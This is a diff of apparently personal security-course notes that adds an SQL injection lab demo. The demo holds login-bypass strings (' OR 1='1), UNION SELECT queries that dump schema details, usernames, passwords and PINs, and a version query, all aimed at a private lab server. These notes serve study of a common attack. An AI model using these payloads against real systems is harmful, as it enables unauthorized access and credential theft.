@@ -186,9 +186,10 @@ COMMANDS ::
 SQL Injection ::
   Require valid SQL queries
   Systems can be vulnerable dur to misconfiguration
+  Information_Schema is default and always exists
   Input field Sanitization
     Unsanitized - can be found using single quotes; will return extra information, may show no errors
-    Sanitized - input fields are checked for items that might harm the databse
+    Sanitized - input fields are checked for items that might harm the database
     Validation - checks to ensure input meets criteria
 
 --- EXAMPLES ---
@@ -196,9 +197,25 @@ SELECT * FROM table_name # selects all column values
 SELECT column1,column2,etc FROM table_name  # selects multiple columns from a given table
 SELECT column FROM table_name  # selects all column value even duplicates
 SELECT DISTINCT column FROM table_name  # shows only distinct colomn values
-
-
-
+--- SQL INJECTION VALIDATION DEMO ---
+1. Go to web server <IP_Address>
+2. Check to see whats normal
+  try and normal password and username
+3. Try SQL Injection Validation
+  joe' OR 1='1  for both username and password
+4. Pull up DevTools and go under Network, click login.php, and switch it to request and raw on the right side
+5. In your search bar enter the following formation
+  <IP_Address>/login.php?username=joe' OR 1='1&passwd=joe' OR 1='1
+    sometimes just type or 1=1 with no qoutes if ' OR 1='1 doesn't work
+6. whatever the hell this is 
+  <IP_Address>/uniondemo.php?Selection=2 UNION select table_schema, table_name, column_name FROM information_schema.columns
+  ex->
+  http://10.50.40.232/uniondemo.php?Selection=3 UNION SELECT username,passwd,pin FROM session.userinfo
+  http://10.50.40.232/uniondemo.php?Selection=3 UNION SELECT id,name,pass FROM session.user
+7. Version information
+  <IP_Address>/uniondemo.php?Selection=3 UNION select 1,2,@@version
+  ex->
+  10.50.40.232/uniondemo.php?Selection=3 UNION select 1,2,@@version
 #############################################
 Reverse Engineering 1-3
 #############################################
